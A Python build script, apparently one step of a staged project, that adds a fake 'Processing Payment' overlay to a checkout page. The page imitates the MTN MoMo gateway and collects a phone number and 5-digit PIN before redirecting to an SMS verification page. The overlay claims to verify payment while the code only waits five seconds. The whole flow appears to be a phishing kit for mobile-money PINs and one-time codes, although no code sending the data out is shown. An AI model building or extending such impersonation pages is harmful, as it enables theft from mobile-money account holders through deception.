#!/usr/bin/env python3
"""act14.py - Timestep 14: payment processing loader.

Adds a 5-second "Processing Payment..." overlay between the MoMo
gateway (checkout.html) and the SMS verification page (sms.html),
mirroring the existing plans-to-checkout redirect loader.

Scope:
  1. Extends Copy with a paymentLoader entry (title, body, footnote,
     dwellMs) so the dwell is data-driven rather than hardcoded.
  2. Inserts a hidden loader overlay into checkout.html.
  3. Rewrites pages/checkout.js so Confirm Payment shows the loader
     for Copy.paymentLoader.dwellMs before navigating to sms.html.

No CSS changes: the existing .overlay, .loader-card and .loader-spinner
rules from act5 already cover this case.

Side effects
------------
* Edits web/assets/js/data/copy.js (idempotent surgical replace).
* Edits web/checkout.html (idempotent surgical insert).
* Rewrites web/assets/js/pages/checkout.js.
* Commits the result with a descriptive message.
"""
from __future__ import annotations

import logging
import subprocess
import sys
from pathlib import Path

SCRIPT_NAME: str = Path(__file__).name
TIMESTEP: int = 14

COMMIT_MESSAGE: str = (
    "act14: add 5s payment-processing loader before sms page\n"
    "\n"
    "Inserts a Processing Payment overlay between checkout and sms.\n"
    "Extends Copy with paymentLoader (title, body, footnote, dwellMs).\n"
    "Rewrites pages/checkout.js so Confirm Payment shows the loader\n"
    "for Copy.paymentLoader.dwellMs before navigating to sms.html.\n"
    "Reuses existing .overlay and .loader-card styles."
)

COPY_JS_OLD: str = """\
    loader: Object.freeze({
      title: "Processing...",
      body: "Securely redirecting to MTN MoMo payment gateway",
      footnote: "Please do not refresh the page",
      dwellMs: 5000
    }),
"""

COPY_JS_NEW: str = """\
    loader: Object.freeze({
      title: "Processing...",
      body: "Securely redirecting to MTN MoMo payment gateway",
      footnote: "Please do not refresh the page",
      dwellMs: 5000
    }),

    paymentLoader: Object.freeze({
      title: "Processing Payment...",
      body: "Verifying your payment with MTN MoMo",
      footnote: "Please do not refresh the page",
      dwellMs: 5000
    }),
"""

CHECKOUT_HTML_OLD: str = """\
    </nav>

  </div>
"""

CHECKOUT_HTML_NEW: str = """\
    </nav>

    <!-- Payment processing loader (shown after Confirm Payment) -------- -->
    <div class="overlay" id="payment-loader" hidden>
      <div class="loader-card" role="status" aria-live="polite">
        <div class="loader-spinner" aria-hidden="true"></div>
        <div class="loader-card__logo" aria-hidden="true">MoMo</div>
        <h2 class="loader-card__title">Processing Payment...</h2>
        <p class="loader-card__body">
          Verifying your payment with MTN MoMo
        </p>
        <p class="loader-card__footnote">Please do not refresh the page</p>
      </div>
    </div>

  </div>
"""

PAGES_CHECKOUT_JS: str = """\
/* ==========================================================================
   pages/checkout.js
   Reads ?plan=<code>, renders the MoMo amount, wires the 5-digit PIN
   field and enables Confirm Payment only when the form is valid.
   On confirm, shows a 5-second payment-processing loader, then
   navigates to sms.html?plan=<code>&phone=<msisdn>.
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var SMS_PAGE = "sms.html";
  var PIN_LENGTH = 5;
  var LOADER_ID = "payment-loader";
  var DEFAULT_PHONE = "079764645";
  var DEFAULT_PAYMENT_DWELL_MS = 5000;

  /**
   * Read a query-string parameter from the current URL.
   * @param {string} name
   * @returns {string | null}
   */
  function getQueryParam(name) {
    var params = new URLSearchParams(global.location.search);
    return params.get(name);
  }

  /**
   * Normalise a phone input into local 0-prefixed display form.
   * @param {string} raw
   * @returns {string}
   */
  function formatLocalPhone(raw) {
    var digits = (raw || "").replace(/\\D+/g, "");
    if (!digits) {
      return "";
    }
    return digits.charAt(0) === "0" ? digits : "0" + digits;
  }

  /**
   * Strip every non-digit from a string.
   * @param {string} value
   * @returns {string}
   */
  function digitsOnly(value) {
    return (value || "").replace(/\\D+/g, "");
  }

  /**
   * Resolve the plan from the URL, falling back to a default.
   * @returns {Plan}
   */
  function resolvePlan() {
    var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
    return global.Plans.findByCode(code) ||
           global.Plans.findByCode(DEFAULT_PLAN_CODE);
  }

  /**
   * Render the amount block.
   * @param {Plan} plan
   */
  function renderAmount(plan) {
    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }
  }

  /**
   * Enable or disable the confirm button based on form validity.
   * @param {HTMLInputElement} pinInput
   * @param {HTMLButtonElement} button
   */
  function syncConfirmState(pinInput, button) {
    button.disabled = pinInput.value.length !== PIN_LENGTH;
  }

  /**
   * Show the payment-processing overlay.
   */
  function showLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  /**
   * Read the configured dwell, falling back to a safe default.
   * @returns {number}
   */
  function paymentDwellMs() {
    return (global.Copy &&
            global.Copy.paymentLoader &&
            global.Copy.paymentLoader.dwellMs) ||
           DEFAULT_PAYMENT_DWELL_MS;
  }

  /**
   * Navigate to *target* after the configured dwell.
   * @param {string} target
   */
  function navigateAfterDwell(target) {
    global.setTimeout(function () {
      global.location.href = target;
    }, paymentDwellMs());
  }

  /**
   * Wire the checkout form.
   * @param {Plan} plan
   */
  function wireForm(plan) {
    var phoneInput = document.getElementById("phone");
    var pinInput = document.getElementById("pin");
    var confirmBtn = document.getElementById("confirm-payment");
    if (!phoneInput || !pinInput || !confirmBtn) {
      return;
    }

    phoneInput.addEventListener("input", function () {
      phoneInput.value = digitsOnly(phoneInput.value).slice(0, 9);
    });

    pinInput.addEventListener("input", function () {
      pinInput.value = digitsOnly(pinInput.value).slice(0, PIN_LENGTH);
      syncConfirmState(pinInput, confirmBtn);
    });

    confirmBtn.addEventListener("click", function () {
      var local = formatLocalPhone(phoneInput.value) || DEFAULT_PHONE;
      var target = SMS_PAGE +
        "?plan=" + encodeURIComponent(plan.code) +
        "&phone=" + encodeURIComponent(local);
      showLoader();
      navigateAfterDwell(target);
    });

    syncConfirmState(pinInput, confirmBtn);
  }

  /**
   * Entry point.
   */
  function init() {
    var plan = resolvePlan();
    renderAmount(plan);
    wireForm(plan);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
"""

LOGGER = logging.getLogger(SCRIPT_NAME)


def project_root() -> Path:
    """Return the directory containing this script."""
    return Path(__file__).resolve().parent


def read_text(path: Path) -> str:
    """Return UTF-8 text, or '' if the file does not exist."""
    if not path.exists():
        return ""
    return path.read_text(encoding="utf-8")


def write_text(path: Path, text: str) -> None:
    """Write UTF-8 with LF endings."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def replace_once(path: Path, old: str, new: str) -> str:
    """Replace *old* with *new* once. Return a short status."""
    text = read_text(path)
    if not text:
        return "missing-file"
    if old not in text:
        if new in text:
            return "already"
        return "no-match"
    write_text(path, text.replace(old, new, 1))
    return "replaced"


def run_git(root: Path, *args: str) -> subprocess.CompletedProcess[str]:
    """Run git in *root*; never raises. Decodes output as UTF-8."""
    return subprocess.run(
        ["git", *args],
        cwd=root,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        check=False,
    )


def main() -> int:
    """Apply the three edits and commit."""
    logging.basicConfig(level=logging.INFO, format="%(message)s", stream=sys.stdout)
    root = project_root()

    LOGGER.info("%s - timestep %d starting", SCRIPT_NAME, TIMESTEP)

    # 1. Extend Copy with paymentLoader
    copy_js = root / "web" / "assets" / "js" / "data" / "copy.js"
    LOGGER.info("[%s] %s (paymentLoader)",
                replace_once(copy_js, COPY_JS_OLD, COPY_JS_NEW),
                copy_js.relative_to(root))

    # 2. Insert loader overlay into checkout.html
    checkout_html = root / "web" / "checkout.html"
    LOGGER.info("[%s] %s (overlay)",
                replace_once(checkout_html, CHECKOUT_HTML_OLD, CHECKOUT_HTML_NEW),
                checkout_html.relative_to(root))

    # 3. Rewrite pages/checkout.js
    checkout_js = root / "web" / "assets" / "js" / "pages" / "checkout.js"
    write_text(checkout_js, PAGES_CHECKOUT_JS)
    LOGGER.info("[written] %s", checkout_js.relative_to(root))

    # Commit
    add = run_git(root, "add", "-A")
    if add.returncode != 0:
        LOGGER.error("git add failed: %s", add.stderr.strip())
        return 1

    commit = run_git(root, "commit", "-m", COMMIT_MESSAGE)
    if commit.returncode != 0:
        LOGGER.error("git commit failed: %s", commit.stderr.strip())
        return 1

    head = run_git(root, "log", "-n", "1", "--oneline")
    LOGGER.info("HEAD is now: %s", head.stdout.strip())
    LOGGER.info("%s - done", SCRIPT_NAME)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())